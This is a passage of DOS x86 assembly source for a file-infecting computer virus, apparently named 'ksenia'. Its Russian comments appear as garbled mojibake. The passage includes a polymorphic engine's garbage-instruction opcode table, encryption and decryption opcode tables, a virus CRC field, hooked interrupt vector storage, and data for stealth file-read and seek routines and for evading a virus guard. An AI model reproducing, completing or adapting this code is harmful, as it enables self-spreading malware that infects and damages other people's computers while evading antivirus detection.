           not     ah              ; ¨¢¥àâ¨à®¢ ¨¥ AH
           test    ah,al           ; ¯à®¢¥àª  ¡¨â®¢
           jz      noreg           ; ¢á¥ ¡¨âë ãáâ ®¢«¥ë?

    newr:  mov     ax,8            ; ¯®«ãç ¥¬ á«ãç ©ë© ®¬¥à
           call    xrandom         ; ®â 0 ¤® 7
           mov     ah,al           ; ¤ã¡«¨àã¥¬ ¥£®

           cmp     w_flag,1        ; â¨¯ § ¯à è¨¢ ¥¬®£® à¥£¨áâà 
           jz      chksp           ; ¢ á«ãç ¥ 8-¡¨â®£® à¥£¨áâà  ¯à®¢¥àª , ¥
           and     al,11111011b    ; ï¢«ï¥âáï «¨ ® ¯®«®¢¨ª®© ¨á¯®«ì§®¢ ëå
           jmp     r_chk

    chksp: cmp     ah,4            ; ¯à®¢¥àª    à¥£¨áâà SP
           jz      newr

    r_chk: push    dx              ; ¯®«ãç¥¨¥ ¬ áª¨ ®¬¥à 
           call    tomask          ; à¥£¨áâà  ¤«ï ¯à®¢¥àª¨ â®£®,
           mov     al,ah           ; çâ® ® ã¦¥ ¨á¯®«ì§ã¥âáï
           mov     ah,dl
           pop     dx
           test    r_used,ah       ; ¯à®¢¥àª  à¥£¨áâà 
           jnz     newr            ; ã¦¥ § ïâ?
           clc                     ; ®ç¨áâª  CF
           ret                     ; ¢ëå®¤ ¨§ ¯®¤¯à®£à ¬¬ë
    noreg: stc
           ret

   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; ’ ¡«¨æ  ®¯ª®¤®¢ ¤«ï ¬ãá®à  (DB “¯à ¢«ïîé¨©_¡ ©â, DB ®¯ª®¤, DB ®¯ª®¤)
   ; “¯à ¢«ïîé¨©_¡ ©â ¢ë£«ï¤¨â á«¥¤ãîé¨¬ ®¡à §®¬:
   ; 00000000
   ; ³³³À´³³À ¤«¨  ¨áâàãªæ¨¨ (+1 ¡ ©â)
   ; ³³³ ³³ÀÄ  ¤®¡®áâì ¯®«ï REG (¡¨âë [0-2] ¯®á«¥¤¥£® ¡ ©â  ª®¬ ¤ë)
   ; ³³³ ³ÀÄÄ  ¤®¡®áâì ¯®«ï WRD
   ; ³³³ ÀÄÄÄ ¤®¡ ¢«¥¨¥ á«ãç ©®£® § ç¥¨ï (00-¥â,01-¡ ©â,10-á«®¢®,11-¯® WRD)
   ; ³³ÀÄÄÄÄÄ ®¯¥à æ¨ï  ¤ ¯ ¬ïâìî, ‚‘… Ž‘’€‹œ*›… *ˆ’› ˆƒ*Ž*ˆ*“ž’‘Ÿ (WF=0)
   ; ³ÀÄÄÄÄÄÄ § ç¥¨¥ ¯®«ï WRD, ¥á«¨ ¥£® ¥  ¤® £¥¥à¨âì
   ; ÀÄÄÄÄÄÄÄ £¥¥à æ¨ï 3-å á«ãç ©ëå ¡¨â [5-3] ¢ ¯®á«¥¤¥¬ ¡ ©â¥ ª®¬ ¤ë
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    opcode  label
           db      00011010b,10110000b,00000000b ; MOV     REG,Const (8/16)
           db      01011010b,10111000b,00000000b ; MOV     REG,Const (8/16)
           db      00011111b,11110110b,11000000b ; TEST    REG,Const (8/16)
           db      00011111b,10000000b,11000000b ; ADD     REG,Const (8/16)
           db      00011111b,10000000b,11001000b ; OR      REG,Const (8/16)
           db      00011111b,10000000b,11010000b ; ADC     REG,Const (8/16)
           db      00011111b,10000000b,11011000b ; SBB     REG,Const (8/16)
           db      00011111b,10000000b,11100000b ; AND     REG,Const (8/16)
           db      00011111b,10000000b,11101000b ; SUB     REG,Const (8/16)
           db      00011111b,10000000b,11110000b ; XOR     REG,Const (8/16)
           db      00011111b,10000000b,11111000b ; CMP     REG,Const (8/16)

           db      10000111b,10001000b,11000000b ; MOV     REG,REG   (8/16)
           db      10000111b,10000100b,11000000b ; TEST    REG,REG   (8/16) /"D"
           db      10000111b,00000000b,11000000b ; ADD     REG,REG   (8/16)
           db      10000111b,00001000b,11000000b ; OR      REG,REG   (8/16)
           db      10000111b,00010000b,11000000b ; ADC     REG,REG   (8/16)
           db      10000111b,00011000b,11000000b ; SBB     REG,REG   (8/16)
           db      10000111b,00100000b,11000000b ; AND     REG,REG   (8/16)
           db      10000111b,00101000b,11000000b ; SUB     REG,REG   (8/16)
           db      10000111b,00110000b,11000000b ; XOR     REG,REG   (8/16)
           db      10000111b,00111000b,11000000b ; ADC     REG,REG   (8/16)

           db      00100000b,10001010b,00000000b ; MOV     REG,[MEM] (8)
           db      00100000b,10000100b,00000000b ; TEST    REG,[MEM] (8) (No "D")
           db      00100000b,00000010b,00000000b ; ADD     REG,[MEM] (8)
           db      00100000b,00001010b,00000000b ; OR      REG,[MEM] (8)
           db      00100000b,00010010b,00000000b ; ADC     REG,[MEM] (8)
           db      00100000b,00011010b,00000000b ; SBB     REG,[MEM] (8)
           db      00100000b,00100010b,00000000b ; AND     REG,[MEM] (8)
           db      00100000b,00101010b,00000000b ; SUB     REG,[MEM] (8)
           db      00100000b,00110010b,00000000b ; XOR     REG,[MEM] (8)
           db      00100000b,00111010b,00000000b ; ADC     REG,[MEM] (8)

           db      00001111b,11000000b,11000000b ; ROL     REG,Const (8/16)
           db      00001111b,11000000b,11001000b ; ROR     REG,Const (8/16)
           db      00001111b,11000000b,11010000b ; RCL     REG,Const (8/16)
           db      00001111b,11000000b,11011000b ; RCR     REG,Const (8/16)
           db      00001111b,11000000b,11100000b ; SHL/SAL REG,Const (8/16)
           db      00001111b,11000000b,11101000b ; SHR     REG,Const (8/16)
           db      00001111b,11000000b,11111000b ; SAR     REG,Const (8/16)

           db      00000111b,11110110b,11011000b ; NEG     REG       (8/16)
           db      00000111b,11110110b,11010000b ; NOT     REG       (8/16)
           db      00000011b,11111110b,11000000b ; INC     REG       (8)
           db      00000011b,11111110b,11001000b ; DEC     REG       (8)
           db      01000010b,01000000b,00000000b ; INC     REG       (16)
           db      01000010b,01001000b,00000000b ; DEC     REG       (16)

           db      00000000b,11111000b,00000000b ; CLC
           db      00000000b,11110101b,00000000b ; CMC
           db      00000000b,11111001b,00000000b ; STC
           db      00000000b,11111100b,00000000b ; CLD
           db      00000000b,11111101b,00000000b ; STD
           db      00000000b,11111010b,00000000b ; CLI
           db      00000000b,11111011b,00000000b ; STI
           db      00000000b,10010000b,00000000b ; NOP
           db      00000001b,11101011b,00000000b ; JMP $+2

    oclen  equ     ($-opcode)/3

   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; ’ ¡«¨æ  ®¯ª®¤®¢ ¤«ï ¨áâàãªæ¨© § /à áè¨äà®¢ª¨
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    enopI  db      10000001b,11110000b       ; XOR
           db      10000001b,11000000b       ; ADD
           db      10000001b,11101000b       ; SUB

    deopI  db      10000001b,11110000b       ; XOR
           db      10000001b,11101000b       ; SUB
           db      10000001b,11000000b       ; ADD
    oplen  equ     (this byte-deopI)/2

   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; ª®¥æ ¯®¤áç¥â  CRC
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    end_crc:

    random1                dw      0          ; ¯ à  á«ãç ©ëå ç¨á¥«
    random2                dw      0
    checksum               dd      0          ; CRC32 ¢¨àãá 
    host                   db      'C'        ; â¨¯ § à ¦¥®© ¯à®£à ¬¬ë

    epb                    dw      0          ; Execute Parameter Block
                           dw      80h        ; ª®¬ ¤ ï áâà®ª 
    seg0                   dw      0
                           dw      5ch        ; FCB#1
    seg1                   dw      0
                           dw      6ch        ; FCB#2
    seg2                   dw      0

   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; ª®¥æ è¨äà®¢ ®© ç áâ¨ ¢¨àãá  (2-¬ á¯®á®¡®¬ - internal)
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    endi:

    SaveRegs:
           pushf                   ; á®åà ¥¨¥ á ¬¨å à¥£¨áâà®¢
           push    eax bx edx si di bp es ds
           mov     bp,sp
           push    w [bp.rcx]      ; ª®¯¨à®¢ ¨¥  ¤à¥á  ¢®§¢à â 
           mov     [bp.rcx],cx
           mov     bp,[bp.rbp]     ; ¢®ááâ ®¢«¥¨¥ BP
           ret

    LoadRegs:
           pop     cx              ; ¢®ááâ ®¢«¥¨¥ á¬¥é¥¨ï ¢®§¢à â 
           mov     bp,sp           ; ª®¯¨à®¢ ¨¥  ¤à¥á  ¢®§¢à â  ¢ ¯ãáâãî
           xchg    cx,[bp.rcx]
           pop     ds es bp di si edx bx eax
           popf
           ret

    rreg           struc
    rds            dw      ?       ; ¬¥áâ®à á¯®«®¦¥¨¥ á®åà ¥ëå
    res            dw      ?       ; à¥£¨áâà®¢ ¢ áâ¥ª¥
    rbp            dw      ?
    rdi            dw      ?
    rsi            dw      ?
    redx           dd      ?
    rbx            dw      ?
    reax           dd      ?
    rflg           dw      ?
    rcx            dw      ?
    rreg           ends

    if             ($-ksenia+crlen) mod 2 eq 1
                   nop
    endif

    original       db      0c3h       ; ®¨ ¤®«¦ë ¡ëâì ¯®á«¥¤¨¬¨ !!!
                   db      31 dup (0) ; ®¨ ¤®«¦ë ¡ëâì ¯®á«¥¤¨¬¨ !!!

   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; ®¡« áâì ¥¤¨áª®¢ëå ¤ ëå - ª®¥æ ä ©«®¢®© ç áâ¨ ¢¨àãá 
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    eov:

    io08           dw      ?,?        ; ïç¥©ª¨ åà ¥¨ï ¢¥ªâ®à®¢
    io21p          dw      ?,?        ; ¯à¥àë¢ ¨©
    io24           dw      ?,?
    stf           db      ?          ; à¥¦¨¬ áâ¥«á (mcbcheck)
    seek_pos       dw      ?,?        ; ¯®§¨æ¨ï ãª § â¥«ï (SeekSave)
    nrbytes        dw      ?          ; ¯à®ç¨â ë¥ ¡ ©âë (ReadStealth)

    r_used         db      ?          ; [NEXUS] Polymorphic engine
    indexr         db      ?           ;
    indexm         db      ?            ;
    countr         db      ?             ;
    accumr         db      ?              ;
    r_ptr          dw      ?               ;
    w_flag         db      ?                ;
    crbuf          db      4 dup (?)         ;
    nbuf           db      4*cripts+1 dup (?) ;
    pushs          db      7 dup (?)         ;
    delta          dw      ?                ;

    fn_ptr         dw      ?,?        ; ¨¬ï ä ©«  (ClrAttrib)
    attrib         dw      ?          ;  ââà¨¡ãâë (ClrAttrib)
    time           dw      ?          ; ¢à¥¬ï ä ©«  (GetDate)
    date           dw      ?          ; ¤ â  ä ©«  (GetDate)
    w95state       dw      ?          ; á®áâ®ï¨¥ Win95 (â®ç¥¥ WinOldAp)
    save_ax        dw      ?          ; ¯¥à¥¤ ç  ¯ à ¬¥âà®¢ ¬¥¥¤¦¥à 
    save_bx        dw      ?          ; à¥§¨¤¥â®© ç áâ¨ ®¡à ¡®âç¨ª ¬
    save_es        dw      ?          ;
    reqhdr         dw      ?,?        ; REQUEST_HEADER
    intcall        dw      ?,?        ; SYS_INTERRUPT
    delay          db      ?          ; áç¥âç¨ª ¤«ï Virus Guard

    header         db      32 dup (?)
    buffer         db      vsize dup (?)
    stacks         db      100h dup (?)

    eom:           end     ksenia
